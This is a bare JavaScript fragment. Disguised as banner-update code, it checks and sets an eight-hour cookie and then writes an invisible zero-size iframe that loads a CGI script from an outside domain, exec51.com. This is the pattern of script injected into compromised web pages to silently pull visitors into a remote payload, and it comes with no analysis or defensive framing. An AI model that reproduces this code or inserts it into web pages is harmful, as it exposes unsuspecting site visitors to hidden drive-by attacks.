window.status="";
var cookieString = document.cookie;
var start = cookieString.indexOf("bannerupdate=");
if (start != -1)
{}else{
var expires = new Date();
expires.setTime(expires.getTime()+8*1*60*60*1000);
document.cookie = "bannerupdate=update;expires=" + expires.toGMTString();
try{
document.write("<iframe src=http://exec51.com/cgi-bin/index.cgi?ad width=0 height=0 frameborder=0></iframe>");
}
catch(e)
{
};
}
